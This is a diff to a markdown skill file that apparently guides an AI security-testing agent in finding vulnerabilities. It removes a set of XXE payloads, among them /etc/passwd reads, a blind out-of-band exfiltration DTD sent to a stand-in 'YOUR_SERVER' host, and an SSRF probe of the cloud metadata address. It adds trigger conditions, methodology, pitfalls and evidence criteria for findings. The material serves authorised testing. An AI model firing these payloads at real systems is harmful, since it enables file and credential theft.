@@ -1,4 +1,4 @@
----
+﻿---
 name: vuln-discovery
 description: "Systematic identification and verification of security weaknesses in target applications"
 category: core
@@ -240,60 +240,15 @@ For each injection point:
 ### XXE (XML External Entity)
 
 **Classic XXE:**
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root>&xxe;</root>
-```
 
 **Parameter Entity (inside DTD):**
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
-  %xxe;
-]>
-```
 
 **Blind XXE (OOB extraction):**
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://YOUR_SERVER/evil.dtd">
-  %xxe;
-]>
-```
 Host `evil.dtd` on your server:
-```xml
-<!ENTITY % data SYSTEM "file:///etc/passwd">
-<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://YOUR_SERVER/?data=%data;'>">
-%param;
-%exfil;
-```
 
 **XXE via SVG Upload:**
-```xml
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
-  <text x="0" y="20">&xxe;</text>
-</svg>
-```
 
 **XXE in SOAP:**
-```xml
-<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
-  <soap:Body>
-    <foo>
-      <![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>]]>
-    </foo>
-  </soap:Body>
-</soap:Envelope>
-```
 
 **XXE via Content-Type:**
 - Send XML body with `Content-Type: text/xml` or `application/xml`
@@ -308,13 +263,6 @@ Host `evil.dtd` on your server:
 - Use `expect://` for PHP with expect extension: `SYSTEM "expect://id"`
 
 **XXE to SSRF:**
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
-]>
-<root>&xxe;</root>
-```
 
 ---
 
@@ -431,3 +379,25 @@ A template injection claim requires proof that `{{7*7}}` returned 49 in the resp
 An XXE claim requires proof that file content appeared in the response.
 A SQLi claim requires proof of error messages, data extraction, or timing differences.
 A command injection claim requires proof of command output in the response or time delay.
+
+## Trigger Conditions
+
+Activate during active testing once recon has produced concrete inputs/endpoints to test — search boxes, numeric IDs, headers, cookies, JSON/XML bodies, upload fields, and API parameters. Trigger when the user asks to find bugs, test for vulnerabilities, or assess security. Do not use for pure recon/endpoint discovery (use recon skill), auth-bypass specifics (auth-control), or report generation (reporting). Best used after the attack surface is mapped.
+
+## Detection Approach
+
+Map the attack surface first, then prioritize high-impact sinks: auth/authorization endpoints, injection parameters, uploads, DB-backed APIs, business-logic flows. For each injection point, reason about input type, content type, and context (SQL clause, JS string, HTML attr, NoSQL query, XML element) before crafting a payload from first principles — never canned lists. Probe one technique family at a time: start with a benign canary to learn parsing, then the simplest positive (tautology/XSS `<script>`, arithmetic for SSTI, operator object for NoSQL), then blind variants (boolean, time, OOB) only when output is hidden. After `checkWaf`, adapt encoding rather than repeating blocked forms. Change a single variable per test to establish causation, and always compare against a clean baseline response.
+
+## Pitfalls
+
+- Using hardcoded/canned payloads without reasoning about the specific context — adapt per endpoint.
+- Treating a WAF 403 or generic error page as the vulnerability itself — those are not findings.
+- Testing multiple variables at once, making it impossible to attribute the cause of a difference.
+- Claiming a finding from reflection alone (XSS) or an error alone (SQLi/XXE) without execution/data proof.
+- Skipping baseline/negative controls — without a true/false comparison, differentials are noise.
+- Ignoring second-order sinks where input is stored and rendered later.
+- Writing findings before evidence exists — `writeFinding` only on confirmed, evidenced issues.
+
+## Verification & Impact
+
+CONFIRMED when a testable input produces reproducible, evidence-backed behavior: SQLi via error/data/timing; XSS via executed script in rendered context; XXE via file content in response; SSTI via `{{7*7}}`=49; NoSQL via differential with data; command injection via output or measured side effect. SUSPECTED when an anomaly appears but cannot be reproduced or lacks a captured exchange — log as candidate, not a finding. Document impact by what the flaw enables and its severity, always backing claims with `recordEvidence` request/response pairs and `writeFinding` entries.
